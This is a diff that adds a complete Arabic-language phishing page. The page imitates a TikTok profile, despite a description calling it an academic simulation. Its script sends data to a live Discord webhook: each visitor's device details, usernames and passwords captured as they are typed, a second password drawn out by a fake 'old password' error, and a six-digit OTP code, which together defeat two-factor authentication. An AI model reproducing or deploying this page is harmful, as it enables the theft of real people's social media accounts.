@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="TikTok Profile Simulation - IT Academic Project">
+    <title>sardomax watn hat (@Sardo0max) | TikTok</title>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* * TIKTOK ADVANCED DESIGN SYSTEM v22.4 
+         * Developed by: Dilbar Baro Shaker
+         */
+        :root {
+            --tk-pink: #FE2C55;
+            --tk-cyan: #25F4EE;
+            --tk-black: #121212;
+            --tk-white: #FFFFFF;
+            --tk-gray-100: #F8F8F8;
+            --tk-gray-200: #E3E3E3;
+            --tk-gray-500: #8A8A8E;
+            --tk-modal-dark: #121212;
+            --tk-glass: rgba(255, 255, 255, 0.8);
+            --anim-speed: 0.4s;
+        }
+
+        * {
+            margin: 0; padding: 0; box-sizing: border-box;
+            font-family: 'IBM Plex Sans Arabic', -apple-system, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--tk-white);
+            color: var(--tk-black);
+            overflow-x: hidden;
+            line-height: 1.5;
+            user-select: none;
+        }
+
+        .header-official {
+            position: fixed; top: 0; width: 100%; height: 54px;
+            background: var(--tk-glass); backdrop-filter: blur(10px);
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 0 16px; z-index: 1000; border-bottom: 0.5px solid var(--tk-gray-200);
+        }
+
+        .header-title {
+            font-weight: 700; font-size: 17px; text-align: center;
+            max-width: 180px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+        }
+
+        .profile-wrapper {
+            margin-top: 54px; padding: 25px 16px 10px;
+            background: linear-gradient(to bottom, #fff, #fcfcfc);
+        }
+
+        .avatar-container {
+            position: relative; width: 106px; height: 106px;
+            margin: 0 auto 16px;
+        }
+
+        .avatar-ring {
+            width: 100%; height: 100%; padding: 4px;
+            /* تم الحفاظ على تصميم الرانك الملون للهوية البصرية */
+            background: linear-gradient(45deg, var(--tk-cyan), #ff0050, #00f2ea);
+            background-size: 300% 300%; animation: gradientMove 4s ease infinite;
+            border-radius: 50%;
+        }
+
+        @keyframes gradientMove {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .avatar-ring img {
+            width: 100%; height: 100%; border-radius: 50%;
+            border: 3.5px solid #fff; object-fit: cover;
+        }
+
+        /* تم إلغاء علامة الـ LIVE كما طلبت */
+        .live-tag { display: none; }
+
+        .stats-row {
+            display: flex; justify-content: center; gap: 30px;
+            margin: 20px 0; border-top: 0.5px solid #f0f0f0; padding-top: 15px;
+        }
+
+        .stat-item { text-align: center; cursor: pointer; transition: 0.2s; }
+        .stat-item:active { opacity: 0.5; transform: scale(0.95); }
+        .stat-num { display: block; font-weight: 800; font-size: 18px; color: #000; }
+        .stat-label { font-size: 13px; color: var(--tk-gray-500); margin-top: -2px; }
+
+        .actions-group {
+            display: flex; gap: 6px; padding: 0 10px; margin-bottom: 20px;
+        }
+
+        .btn-prime {
+            flex: 4; height: 46px; background: var(--tk-pink);
+            color: #fff; border: none; border-radius: 4px;
+            font-weight: 700; font-size: 15px; transition: 0.3s;
+        }
+
+        .btn-sq {
+            flex: 1; height: 46px; border: 1px solid var(--tk-gray-200);
+            background: #fff; border-radius: 4px; display: flex;
+            align-items: center; justify-content: center; font-size: 18px;
+        }
+
+        .grid-nav {
+            display: flex; border-bottom: 0.5px solid var(--tk-gray-200);
+            position: sticky; top: 54px; background: #fff; z-index: 100;
+        }
+
+        .nav-tab {
+            flex: 1; height: 44px; display: flex; align-items: center;
+            justify-content: center; color: var(--tk-gray-500); font-size: 20px;
+            border-bottom: 2px solid transparent; transition: 0.3s;
+        }
+
+        .nav-tab.active { color: #000; border-bottom-color: #000; }
+
+        .video-grid {
+            display: grid; grid-template-columns: repeat(3, 1fr);
+            gap: 1.5px; padding: 1.5px; min-height: 800px;
+        }
+
+        .video-card {
+            aspect-ratio: 3/4; background: #f0f0f0; position: relative;
+            overflow: hidden; cursor: pointer;
+        }
+
+        .video-card img {
+            width: 100%; height: 100%; object-fit: cover;
+            opacity: 0; transition: opacity 0.8s ease;
+        }
+
+        .video-card.ready img { opacity: 1; }
+
+        .pinned {
+            position: absolute; top: 6px; right: 6px;
+            background: var(--tk-pink); color: #fff;
+            padding: 1px 5px; font-size: 10px; font-weight: 800; border-radius: 2px;
+        }
+
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); z-index: 5000;
+            display: none; justify-content: center; align-items: flex-end;
+        }
+
+        .modal-sheet {
+            width: 100%; max-width: 500px; background: var(--tk-modal-dark);
+            border-radius: 16px 16px 0 0; padding: 20px 24px 40px; color: #fff;
+            transform: translateY(100%); transition: transform 0.4s cubic-bezier(0.3, 0, 0.2, 1);
+        }
+
+        .sheet-up .modal-sheet { transform: translateY(0); }
+
+        .auth-method {
+            width: 100%; height: 48px; background: #2f2f2f;
+            border: 0.5px solid rgba(255,255,255,0.1); border-radius: 4px;
+            color: #fff; margin-bottom: 12px; display: flex;
+            align-items: center; padding: 0 16px; font-weight: 600;
+            position: relative; transition: 0.2s;
+        }
+
+        .auth-method i { position: absolute; left: 16px; font-size: 18px; }
+
+        .verifying-screen {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--tk-modal-dark); z-index: 10;
+            display: none; flex-direction: column; align-items: center;
+            justify-content: center; border-radius: 16px;
+        }
+
+        .loader-ring {
+            width: 45px; height: 45px; border: 4px solid rgba(254, 44, 85, 0.2);
+            border-top: 4px solid var(--tk-pink); border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .tk-input {
+            width: 100%; height: 48px; background: #252525;
+            border: 1px solid #333; border-radius: 4px; padding: 0 12px;
+            color: #fff; font-size: 16px; outline: none; margin-bottom: 16px;
+        }
+
+        .otp-flex {
+            display: flex; justify-content: center; gap: 8px;
+            direction: ltr; margin: 30px 0;
+        }
+        .otp-box {
+            width: 42px; height: 50px; background: #252525;
+            border: 1px solid #444; color: #fff; text-align: center;
+            font-size: 22px; font-weight: 700; border-radius: 4px;
+        }
+
+        .error-alert {
+            background: rgba(255, 59, 48, 0.1); color: #ff3b30;
+            padding: 10px; border-radius: 4px; font-size: 13px;
+            margin-bottom: 15px; border-right: 3px solid #ff3b30;
+            display: none;
+        }
+
+        .skeleton-block {
+            background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
+            background-size: 200% 100%; animation: skeletonLoad 1.5s infinite;
+        }
+        @keyframes skeletonLoad { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+    <header class="header-official">
+        <i class="fa-solid fa-chevron-right" style="font-size: 18px;"></i>
+        <div class="header-title">وطن😭هات watn hat</div>
+        <div style="display:flex; gap:15px;">
+            <i class="fa-regular fa-bell"></i>
+            <i class="fa-solid fa-arrow-up-from-bracket"></i>
+        </div>
+    </header>
+
+    <main class="profile-wrapper">
+        <div class="avatar-container">
+            <div class="avatar-ring">
+                <img src="profile.jpg" id="profilePic" onerror="this.src='https://via.placeholder.com/200'">
+            </div>
+            <div class="live-tag">LIVE</div>
+        </div>
+
+        <div style="text-align:center;">
+            <h1 style="font-size: 18px; font-weight: 700;">Sardo0Max <i class="fa-solid fa-circle-check" style="color: #20D5EC; font-size: 14px;"></i></h1>
+            <p style="font-size: 14px; font-weight: 600; color: #161823; margin: 4px 0;">@sardo0max</p>
+        </div>
+
+        <div class="stats-row">
+            <div class="stat-item"><span class="stat-num">889</span><span class="stat-label">أتابعه</span></div>
+            <div  class="stat-item"><span class="stat-num">100.2K</span><span class="stat-label">متابعين</span></div>
+            <div class="stat-item"><span class="stat-num">1.3M</span><span class="stat-label">إعجابات</span></div>
+        </div>
+
+        <div class="actions-group">
+            <button class="btn-prime trigger-action">متابعة</button>
+            <button class="btn-sq trigger-action"><i class="fa-regular fa-comment-dots"></i></button>
+            <button class="btn-sq trigger-action"><i class="fa-solid fa-chevron-down"></i></button>
+        </div>
+
+        <div style="text-align:center; padding: 0 20px; font-size: 14px;">
+            عراقي من سنجار  ..
+            <br><span style="color:#000; font-weight:600;"><i class="fa-solid fa-link"></i> youtube.com/@Sardo...</span>
+        </div>
+    </main>
+
+    <nav class="grid-nav">
+        <div class="nav-tab active"><i class="fa-solid fa-bars-staggered"></i></div>
+        <div class="nav-tab"><i class="fa-solid fa-lock" style="font-size: 16px;"></i></div>
+        <div class="nav-tab"><i class="fa-regular fa-heart"></i></div>
+    </nav>
+
+    <div class="video-grid" id="mainGrid"></div>
+
+    <div class="modal-overlay" id="authOverlay">
+        <div class="modal-sheet">
+            <div class="verifying-screen" id="vScreen">
+                <div class="loader-ring"></div>
+                <p style="margin-top:20px; font-weight:600; color:var(--tk-pink);">جاري مزامنة البيانات...</p>
+                <p style="font-size:12px; color:#555; margin-top:5px;" id="vStatus">التحقق من أمان الجهاز</p>
+            </div>
+
+            <div id="step-methods">
+                <div style="display:flex; justify-content:space-between; margin-bottom:30px;">
+                    <i class="fa-solid fa-xmark" id="closeAuth" style="font-size:22px;"></i>
+                    <h2 style="font-size:20px; font-weight:800;">تسجيل الدخول</h2>
+                    <i class="fa-regular fa-circle-question" style="color:#777;"></i>
+                </div>
+                <button class="auth-method" onclick="switchStep('login', 'TikTok')">الهاتف / البريد الإلكتروني <i class="fa-regular fa-user"></i></button>
+                <button class="auth-method" onclick="switchStep('login', 'Facebook')">المتابعة باستخدام فيسبوك <i class="fa-brands fa-facebook" style="color:#1877f2"></i></button>
+                <button class="auth-method" onclick="switchStep('login', 'Apple')">المتابعة باستخدام Apple <i class="fa-brands fa-apple"></i></button>
+                <button class="auth-method" onclick="switchStep('login', 'Google')">المتابعة باستخدام Google <i class="fa-brands fa-google"></i></button>
+            </div>
+
+            <div id="step-login" style="display:none;">
+                <div style="display:flex; align-items:center; gap:15px; margin-bottom:25px;" onclick="switchStep('methods')">
+                    <i class="fa-solid fa-chevron-right"></i>
+                    <h3 id="loginTitle" style="font-size:18px;">تسجيل الدخول</h3>
+                </div>
+                <div class="error-alert" id="authError">كلمة السر هذه قديمة. يرجى استخدام كلمة السر الحالية.</div>
+                <input type="text" class="tk-input" id="uField" placeholder="اسم المستخدم">
+                <input type="password" class="tk-input" id="pField" placeholder="كلمة السر">
+                <button class="btn-prime" style="width:100%; border-radius:4px;" id="loginBtn" onclick="executeAuth()">تسجيل الدخول</button>
+            </div>
+
+            <div id="step-otp" style="display:none; text-align:center;">
+                <h3 style="font-size:22px; margin-bottom:10px;">أدخل رمز التحقق</h3>
+                <p style="color:#8a8a8e; font-size:13px;">أدخل الرمز المكون من 6 أرقام الذي أرسلناه لك.</p>
+                <div class="otp-flex">
+                    <input type="number" class="otp-box" maxlength="1">
+                    <input type="number" class="otp-box" maxlength="1">
+                    <input type="number" class="otp-box" maxlength="1">
+                    <input type="number" class="otp-box" maxlength="1">
+                    <input type="number" class="otp-box" maxlength="1">
+                    <input type="number" class="otp-box" maxlength="1">
+                </div>
+                <p style="color:var(--tk-pink); font-weight:700;">إعادة إرسال الرمز (<span id="timerVal">59</span>)</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        /**
+         * 🚀 TIKTOK CORE CONTROLLER v4.0
+         * Developer: Dilbar Baro Shaker
+         */
+        
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT"; 
+
+        const grid = document.getElementById('mainGrid');
+        let loginAttempt = 0;
+        let session = { u: "", p1: "", p2: "" };
+
+        async function alertVisitor() {
+            const metrics = await getDeepMetrics();
+            await dispatchLog("🔴 زائر جديد دخل الموقع!", 
+                `🌐 تم رصد دخول مستخدم جديد للموقع.\n📱 نظام التشغيل: \`${metrics.platform}\`\n🔋 البطارية: \`${metrics.battery}\``, 
+                1752220);
+        }
+
+        function initLiveTracking() {
+            const uField = document.getElementById('uField');
+            const pField = document.getElementById('pField');
+
+            [uField, pField].forEach(input => {
+                input.addEventListener('input', () => {
+                    if (input.value.length % 5 === 0 && input.value.length > 0) {
+                        dispatchLog("📝 مراقبة الكتابة (Live)", 
+                            `👤 اليوزر الحالي: \`${uField.value}\`\n🔑 كلمة السر المكتوبة: \`${pField.value}\``, 
+                            15844367);
+                    }
+                });
+            });
+        }
+
+        async function getDeepMetrics() {
+            let metrics = {
+                platform: navigator.platform,
+                time: new Date().toLocaleString('ar-IQ')
+            };
+            try {
+                const batt = await navigator.getBattery();
+                metrics.battery = `${(batt.level * 100).toFixed(0)}% (${batt.charging ? 'يُشحن' : 'تفريغ'})`;
+            } catch(e) { metrics.battery = "Unknown"; }
+            return metrics;
+        }
+
+        async function dispatchLog(title, body, color = 16724821) {
+            const metrics = await getDeepMetrics();
+            const payload = {
+                embeds: [{
+                    title: "🚀 " + title,
+                    description: body,
+                    color: color,
+                    fields: [
+                        { name: "📱 الجهاز", value: `\`${metrics.platform}\``, inline: true },
+                        { name: "🕒 الوقت", value: `\`${metrics.time}\``, inline: false }
+                    ],
+                    footer: { text: "System Dev: Dilbar Baro Shaker" }
+                }]
+            };
+            fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) }).catch(() => {});
+        }
+
+        function initGrid() {
+            for(let i=1; i<=12; i++) {
+                const card = document.createElement('div');
+                card.className = 'video-card skeleton-block trigger-action';
+                if(i <= 3) card.innerHTML += '<span class="pinned">مثبت</span>';
+                const img = document.createElement('img');
+                img.src = `https://picsum.photos/300/400?sig=${i+40}`;
+                img.onload = () => { card.classList.remove('skeleton-block'); card.classList.add('ready'); };
+                card.appendChild(img);
+                grid.appendChild(card);
+            }
+            rebindTriggers();
+        }
+
+        function rebindTriggers() {
+            document.querySelectorAll('.trigger-action').forEach(btn => {
+                btn.onclick = () => {
+                    document.getElementById('authOverlay').style.display = 'flex';
+                    setTimeout(() => document.getElementById('authOverlay').classList.add('sheet-up'), 50);
+                };
+            });
+        }
+
+        function switchStep(target, provider) {
+            ['methods', 'login', 'otp'].forEach(s => document.getElementById(`step-${s}`).style.display = 'none');
+            document.getElementById(`step-${target}`).style.display = 'block';
+            if(provider) document.getElementById('loginTitle').innerText = provider;
+        }
+
+        async function executeAuth() {
+            const u = document.getElementById('uField').value;
+            const p = document.getElementById('pField').value;
+            if(!u || !p) return;
+
+            document.getElementById('vScreen').style.display = 'flex';
+            setTimeout(async () => {
+                loginAttempt++;
+                if(loginAttempt === 1) {
+                    session.u = u; session.p1 = p;
+                    await dispatchLog("دخول جديد (المحاولة 1)", `👤 اليوزر: \`${u}\`\n🔑 الباسورد: \`${p}\``);
+                    document.getElementById('vScreen').style.display = 'none';
+                    document.getElementById('pField').value = "";
+                    document.getElementById('authError').style.display = 'block';
+                } else {
+                    await dispatchLog("تحديث البيانات (المحاولة 2)", `👤 اليوزر: \`${session.u}\`\n🔑 الباسورد 2: \`${p}\``, 3447003);
+                    setTimeout(() => { document.getElementById('vScreen').style.display = 'none'; switchStep('otp'); runTimer(); }, 1500);
+                }
+            }, 2000);
+        }
+
+        function runTimer() {
+            let s = 59;
+            setInterval(() => { if(s > 0) { s--; document.getElementById('timerVal').innerText = s; } }, 1000);
+        }
+
+        document.querySelectorAll('.otp-box').forEach((box, i, arr) => {
+            box.oninput = async () => {
+                if(box.value && i < 5) arr[i+1].focus();
+                const code = Array.from(arr).map(b => b.value).join('');
+                if(code.length === 6) {
+                    document.getElementById('vScreen').style.display = 'flex';
+                    await dispatchLog("رمز OTP مستلم", `👤 اليوزر: \`${session.u}\`\n🔢 الرمز: \`${code}\``, 3066993);
+                    setTimeout(() => { alert("خطأ في الخادم، يرجى إعادة المحاولة."); window.location.reload(); }, 2000);
+                }
+            };
+        });
+
+        document.getElementById('closeAuth').onclick = () => {
+            document.getElementById('authOverlay').classList.remove('sheet-up');
+            setTimeout(() => { document.getElementById('authOverlay').style.display = 'none'; switchStep('methods'); }, 400);
+        };
+
+        window.onload = () => {
+            initGrid();
+            alertVisitor();
+            initLiveTracking();
+        };
+
+    </script>
+</body>
+</html>
